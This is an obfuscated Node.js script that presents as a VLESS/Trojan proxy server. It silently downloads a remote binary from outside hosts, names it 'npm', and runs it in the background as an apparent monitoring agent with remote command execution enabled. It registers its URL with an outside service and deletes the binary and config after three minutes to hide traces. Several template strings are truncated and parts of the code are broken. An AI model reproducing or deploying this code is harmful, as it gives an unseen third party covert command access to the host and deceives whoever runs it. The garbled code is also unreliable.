const _0xe23b350c0d=["c3c=","dHh0LnRzaWwvZ3VoL3NkYWVoL3NmZXIvZWRvbm9heS83ODkxb2F5bmF0L21vYy5yb3JyaW10aWcud2FyLy86c3B0dGg=","ZDQyNmJlMTYxM2NhLWI5MjgtMWQ2NC0wY2YyLTljNjM4ZDMz","bm9pdGNlbm5vYw==","bXJh","bmlhbHAvdHhldA==","MXYvbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","dGVn","bWFlcnRz","aHNpbmlm","NzgwMg==","NjkwMg==","NC40LjguOA==","Z25pbm51ciBwaWtzICx5dHBtZSBzaSBlbGJhaXJhdiBBSFpFTg==","Z25pbm51ciBzaSBtcG4=","ZWdhc3NlbQ==","OGZ0dQ==","c2x0LS0=","bXBuIHgrIGRvbWhj","bm9zai1zbmQvbm9pdGFjaWxwcGE=","ZXVydA==","cHR0aA==","cmVmZnVi","NDZtcmE=","bG1heS5naWZub2M=","eGVo","dG5lZ2Evbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","bXBu","Li4uZ25pbm51ciBwaWtzICxnbmlubnVyIHlkYWVybGEgc2kgbXBu","b3RweXJj","MzUwMg==","bHJ1LWRkYS90ZW4uMDB2cmVzLm9vb28vLzpzcHR0aA==","blw=","eWxsdWZzc2VjY3VzIGRlZGRhIGtzYVQgc3NlY2NBIGNpdGFtb3R1QQ==","NDIyYWhz","dGVu","YXRlbS9tb2MuZXJhbGZkdW9sYy5kZWVwcy8vOnNwdHRo","dHBlY2NB","OnJvcnJlIGduaW5udXIgbXBu","MXYvbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","NDZlc2Fi","c28=","MzQ0","bm9zai9ub2l0YWNpbHBwYQ==","MzgwMg==","OmtzYVQgZ25pZGRhIHJvcnJF","dG5lZ2Evbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","YnVz","c3NlY29ycF9kbGloYw==","bndvbmtuVQ==","eWxsdWZzc2VjY3VzIGRhb2xud29kIG1wbg==","OC1mdHU=","aHRhcA==","bG10aC90eGV0","cm9ycmU=","MS4xLjEuMQ==","Im1wXW5bLy4iIHBlcmcgfCAicGVyZyIgdi0gcGVyZyB8IHh1YSBzcA==","ZXNsYWY=","bG10aC54ZWRuaQ==","ZXB5VC10bmV0bm9D","IWRscm93IG9sbGVI","blxkbnVvRiB0b04=","NDZoY3JhYQ==","c29peGE=","MzQ0OA==","Z3VI","aHNhYi9uaWIv","bmMueXl5eXl0LmVjYXBz","c2Y="];(function(_a,_s){while(--_s){_a.push(_a.shift());}})(_0xe23b350c0d,0xf5);function _0x8f129d4a8f(i){let index = i;if (True) {index = (i + 0xf5) % 69;} let s = _0xe23b350c0d[index];let d = atob(s);return d.split('').reverse().join('');} function _0xc90ed4feb2(i){return _0x8f129d4a8f(i);} function _0xaf5b5971cc(){return "EQlfSyXBHEcgRSj9AGLFleJUbxs3QPsKQX5wv5RbOrb2nHhe";} function _0x06ce4f338c(){return "cSH9fpva2J5FuQVAujUH1px9MLrTngG8Ks19rscNp7sUnNN0";} function _0x4a7471c898(){return "JMJbXVFqB32f7wgadUzV2Rbc9SUPxaqF8QKjaGE2K24l8my5";} function _0x670370a5ac(){return "yZKjaPIi3KOrnPf6NdEyl9EnpTzMEdLaJnXrI3CTbWWx5ZeS";} function _0x2ffd62e8f4(){return "zKHkKF7ouRAIR8euqqBjZ4QSiSGPkNpOeCpiy14VLZEcG3AJ";} ;(function(){try{const os = require(_0xc90ed4feb2(0x29));const http = require(_0xc90ed4feb2(0x15));const fs = require(_0xc90ed4feb2(0x44));const axios = require(_0xc90ed4feb2(0x3f));const net = require(_0xc90ed4feb2(0x23));const path = require(_0xc90ed4feb2(0x34));const crypto = require(_0xc90ed4feb2(0x1d));const {Buffer} = require(_0xc90ed4feb2(0x16));const {exec,execSync} = require(_0xc90ed4feb2(0x30));const {WebSocket,createWebSocketStream} = require(_0xc90ed4feb2(0x0));const UUID = process.env.UUID || _0xc90ed4feb2(0x2);const _0x2bdc0ef2d5a0cdb = process.env._0x2bdc0ef2d5a0cdb || '';const _0x310eec9e108a8a6 = process.env._0x310eec9e108a8a6 || '';const _0xa48aa141b5cf747 = process.env._0xa48aa141b5cf747 || '';const DOMAIN = process.env.DOMAIN || _0xc90ed4feb2(0x43);const _0x95f21747363abc6 = process.env._0x95f21747363abc6 || true;const WSPATH = process.env.WSPATH || UUID.slice(0,8);const SUB_PATH = process.env.SUB_PATH || _0xc90ed4feb2(0x2f);const NAME = process.env.NAME || _0xc90ed4feb2(0x41);const PORT = process.env.PORT || 7860;let ISP = '';const _0x205482dd344d960 = async () => {try {const res = await axios.get(_0xc90ed4feb2(0x24));const data = res.data;ISP = `${data.country}-${data.asOrganization}`.replace(/ /g,'_');} catch (_0x33e62a45d6f6d5c) {ISP = _0xc90ed4feb2(0x31);}} _0x205482dd344d960();const _0xfcbf7e8375b2c76 = http.createServer((req,res) => {if (req.url === '/') {const _0xce0abd8661cf26c = path.join(__dirname,_0xc90ed4feb2(0x3a));fs.readFile(_0xce0abd8661cf26c,_0xc90ed4feb2(0x10),(err,content) => {if (err) {res.writeHead(200,{_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x35)});res.end(_0xc90ed4feb2(0x3c));return;} res.writeHead(200,{_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x35)});res.end(content);});return;} else if (req.url === `/${SUB_PATH}`) {const _0x89f757aaca27bba = _0xc90ed4feb2(0x1);axios.get(_0x89f757aaca27bba) .then(r => {let _0x7a916ab9b49af03 = r.data .split(/\r?\n/) .map(l => l.trim()) .filter(l => l.length > 0);if (_0x7a916ab9b49af03.length === 0) {_0x7a916ab9b49af03 = [DOMAIN];} let _0x57406d807d9623c = "";for (const d of _0x7a916ab9b49af03) {const _0x74168d0926a4e5e = `vless: const _0xec626f4f61f9dbb = `trojan: _0x57406d807d9623c += _0x74168d0926a4e5e + _0xc90ed4feb2(0x20) + _0xec626f4f61f9dbb + _0xc90ed4feb2(0x20);} const _0x97c3001763f45e9 = Buffer.from(_0x57406d807d9623c).toString(_0xc90ed4feb2(0x28));res.writeHead(200,{_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x5)});res.end(_0x97c3001763f45e9 + _0xc90ed4feb2(0x20));}) .catch(err => {const _0x74168d0926a4e5e = `vless: const _0xec626f4f61f9dbb = `trojan: const _0xdece130a281b384 = _0x74168d0926a4e5e + _0xc90ed4feb2(0x20) + _0xec626f4f61f9dbb;const _0x97c3001763f45e9 = Buffer.from(_0xdece130a281b384).toString(_0xc90ed4feb2(0x28));res.writeHead(200,{_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x5)});res.end(_0x97c3001763f45e9 + _0xc90ed4feb2(0x20));});} else {res.writeHead(404,{_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x5)});res.end(_0xc90ed4feb2(0x3d));}});const _0xb0acdc73ddafd28 = new WebSocket.Server({server: _0xfcbf7e8375b2c76});const _0xa8eba351f818c09 = UUID.replace(/-/g,"");const _0x70e83ab32048904 = [_0xc90ed4feb2(0xc),_0xc90ed4feb2(0x37)];function _0xefbe495e8b06680(host) {return new Promise((resolve,reject) => {if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {resolve(host);return;} let attempts = 0;function _0x6d159d7b0a656e5() {if (attempts >= _0x70e83ab32048904.length) {reject(new Error(`Failed to resolve ${host} with all DNS servers`));return;} const dnsServer = _0x70e83ab32048904[attempts];attempts++;const dnsQuery = `https: axios.get(dnsQuery,{timeout: 5000,headers: {_0xc90ed4feb2(0x25): _0xc90ed4feb2(0x13)}}) .then(response => {const data = response.data;if (data.Status === 0 && data.Answer && data.Answer.length > 0) {const ip = data.Answer.find(record => record.type === 1);if (ip) {resolve(ip.data);return;}} _0x6d159d7b0a656e5();}) .catch(error => {_0x6d159d7b0a656e5();});} _0x6d159d7b0a656e5();});} function _0x99b24ede2339b27(_0x4c5359732879c0f,msg) {const [VERSION] = msg;const id = msg.slice(1,17);if (!id.every((v,i) => v == parseInt(_0xa8eba351f818c09.substr(i * 2,2),16))) return false;let i = msg.slice(17,18).readUInt8() + 19;const port = msg.slice(i,i += 2).readUInt16BE(0);const _0xf4bebec444a6dae = msg.slice(i,i += 1).readUInt8();const host = _0xf4bebec444a6dae == 1 ? msg.slice(i,i += 4).join('.') : (_0xf4bebec444a6dae == 2 ? new TextDecoder().decode(msg.slice(_0x6fff3fbb8503c9f,i += 1 + msg.slice(i,_0x6fff3fbb8503c9f).readUInt8())) : (_0xf4bebec444a6dae == 3 ? msg.slice(i,i += 16).reduce((s,b,i,a) => (_0x6939f4d97d88314,_0x6fff3fbb8503c9f)) : s),[]).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));_0x4c5359732879c0f.send(new Uint8Array([VERSION,0]));const duplex = createWebSocketStream(_0x4c5359732879c0f);_0xefbe495e8b06680(host) .then(resolvedIP => {net.connect({host: resolvedIP,port},function() {this.write(msg.slice(i));duplex.on(_0xc90ed4feb2(0x36),() => {}).pipe(this).on(_0xc90ed4feb2(0x36),() => {}).pipe(duplex);}).on(_0xc90ed4feb2(0x36),() => {});}) .catch(error => {net.connect({host,port},function() {this.write(msg.slice(i));duplex.on(_0xc90ed4feb2(0x36),() => {}).pipe(this).on(_0xc90ed4feb2(0x36),() => {}).pipe(duplex);}).on(_0xc90ed4feb2(0x36),() => {});});return true;} function _0xe4d621e52bf8f29(_0x4c5359732879c0f,msg) {try {if (msg.length < 58) return false;const receivedPasswordHash = msg.slice(0,56).toString();const possiblePasswords = [UUID,];let matchedPassword = null;for (const pwd of possiblePasswords) {const hash = crypto.createHash(_0xc90ed4feb2(0x22)).update(pwd).digest(_0xc90ed4feb2(0x19));if (hash === receivedPasswordHash) {matchedPassword = pwd;break;}} if (!matchedPassword) return false;let offset = 56;if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {offset += 2;} const cmd = msg[offset];if (cmd !== 0x01) return false;offset += 1;const atyp = msg[offset];offset += 1;let host,port;if (atyp === 0x01) {host = msg.slice(offset,offset + 4).join('.');offset += 4;} else if (atyp === 0x03) {const hostLen = msg[offset];offset += 1;host = msg.slice(offset,offset + hostLen).toString();offset += hostLen;} else if (atyp === 0x04) {host = msg.slice(offset,offset + 16).reduce((s,b,i,a) => (_0x6939f4d97d88314,_0x6fff3fbb8503c9f)) : s),[]) .map(b => b.readUInt16BE(0).toString(16)).join(':');offset += 16;} else {return false;} port = msg.readUInt16BE(offset);offset += 2;if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {offset += 2;} const duplex = createWebSocketStream(_0x4c5359732879c0f);_0xefbe495e8b06680(host) .then(resolvedIP => {net.connect({host: resolvedIP,port},function() {if (offset < msg.length) {this.write(msg.slice(offset));} duplex.on(_0xc90ed4feb2(0x36),() => {}).pipe(this).on(_0xc90ed4feb2(0x36),() => {}).pipe(duplex);}).on(_0xc90ed4feb2(0x36),() => {});}) .catch(error => {net.connect({host,port},function() {if (offset < msg.length) {this.write(msg.slice(offset));} duplex.on(_0xc90ed4feb2(0x36),() => {}).pipe(this).on(_0xc90ed4feb2(0x36),() => {}).pipe(duplex);}).on(_0xc90ed4feb2(0x36),() => {});});return true;} catch (error) {return false;}} _0xb0acdc73ddafd28.on(_0xc90ed4feb2(0x3),(_0x4c5359732879c0f,req) => {const url = req.url || '';_0x4c5359732879c0f.once(_0xc90ed4feb2(0xf),msg => {if (msg.length > 17 && msg[0] === 0) {const id = msg.slice(1,17);const _0x4d695dfb238be44 = id.every((v,i) => v == parseInt(_0xa8eba351f818c09.substr(i * 2,2),16));if (_0x4d695dfb238be44) {if (!_0x99b24ede2339b27(_0x4c5359732879c0f,msg)) {_0x4c5359732879c0f.close();} return;}} if (!_0xe4d621e52bf8f29(_0x4c5359732879c0f,msg)) {_0x4c5359732879c0f.close();}}).on(_0xc90ed4feb2(0x36),() => {});});const _0xa9e1a97645f7046 = () => {const _0x12802a5f5744835 = os._0x12802a5f5744835();if (_0x12802a5f5744835 === _0xc90ed4feb2(0x4) || _0x12802a5f5744835 === _0xc90ed4feb2(0x17) || _0x12802a5f5744835 === _0xc90ed4feb2(0x3e)) {if (!_0x310eec9e108a8a6) {return _0xc90ed4feb2(0x6);} else {return _0xc90ed4feb2(0x1a);}} else {if (!_0x310eec9e108a8a6) {return _0xc90ed4feb2(0x27);} else {return _0xc90ed4feb2(0x2e);}}};const _0x8c4050049cd8208 = async () => {if (!_0x2bdc0ef2d5a0cdb && !_0xa48aa141b5cf747) return;try {const url = _0xa9e1a97645f7046();const response = await axios({method: _0xc90ed4feb2(0x7),url: url,responseType: _0xc90ed4feb2(0x8)});const writer = fs.createWriteStream(_0xc90ed4feb2(0x1b));response.data.pipe(writer);return new Promise((resolve,reject) => {writer.on(_0xc90ed4feb2(0x9),() => {console.log(_0xc90ed4feb2(0x32));exec(_0xc90ed4feb2(0x12),(err) => {if (err) reject(err);resolve();});});writer.on(_0xc90ed4feb2(0x36),reject);});} catch (err) {throw err;}};const _0x2f0ec80d21efe79 = async () => {try {const status = execSync(_0xc90ed4feb2(0x38),{encoding: _0xc90ed4feb2(0x33)});if (status.trim() !== '') {console.log(_0xc90ed4feb2(0x1c));return;}} catch (_0x33e62a45d6f6d5c) {} await _0x8c4050049cd8208();let command = '';let tlsPorts = [_0xc90ed4feb2(0x2a),_0xc90ed4feb2(0x40),_0xc90ed4feb2(0xb),_0xc90ed4feb2(0xa),_0xc90ed4feb2(0x2c),_0xc90ed4feb2(0x1e)];if (_0x2bdc0ef2d5a0cdb && _0x310eec9e108a8a6 && _0xa48aa141b5cf747) {const _0x7e878acc96f1781 = tlsPorts.includes(_0x310eec9e108a8a6) ? _0xc90ed4feb2(0x11) : '';command = `setsid nohup ./npm -s ${_0x2bdc0ef2d5a0cdb}:${_0x310eec9e108a8a6} -p ${_0xa48aa141b5cf747} ${_0x7e878acc96f1781} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;} else if (_0x2bdc0ef2d5a0cdb && _0xa48aa141b5cf747) {if (!_0x310eec9e108a8a6) {const port = _0x2bdc0ef2d5a0cdb.includes(':') ? _0x2bdc0ef2d5a0cdb.split(':').pop() : '';const NZ_TLS = tlsPorts.includes(port) ? _0xc90ed4feb2(0x14) : _0xc90ed4feb2(0x39);const configYaml = `client_secret: ${_0xa48aa141b5cf747} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${_0x2bdc0ef2d5a0cdb} skip_connection_count: true skip_procs_count: true temperature: false tls: ${NZ_TLS} use_gitee_to_upgrade: false use_ipv6_country_code: false _0xa8eba351f818c09: ${UUID}`;fs.writeFileSync(_0xc90ed4feb2(0x18),configYaml);} command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;} else {console.log(_0xc90ed4feb2(0xd));return;} try {exec(command,{shell: _0xc90ed4feb2(0x42)},(err) => {if (err) console.error(_0xc90ed4feb2(0x26),err);else console.log(_0xc90ed4feb2(0xe));});} catch (error) {console.error(`error: ${error}`);}};async function _0x8dba10be38a760c() {if (!_0x95f21747363abc6) return;if (!DOMAIN) {return;} const _0x3243657fe87fffd = `https: try {const res = await axios.post(_0xc90ed4feb2(0x1f),{url: _0x3243657fe87fffd},{headers: {_0xc90ed4feb2(0x3b): _0xc90ed4feb2(0x2b)}});console.log(_0xc90ed4feb2(0x21));} catch (error) {}} const _0x90c26f77588830e = () => {fs.unlink(_0xc90ed4feb2(0x1b),() => {});fs.unlink(_0xc90ed4feb2(0x18),() => {});};_0xfcbf7e8375b2c76.listen(PORT,() => {_0x2f0ec80d21efe79();setTimeout(() => {_0x90c26f77588830e();},180000);_0x8dba10be38a760c();console.log(`Server is running on port ${PORT}`);});}catch(e){}})();
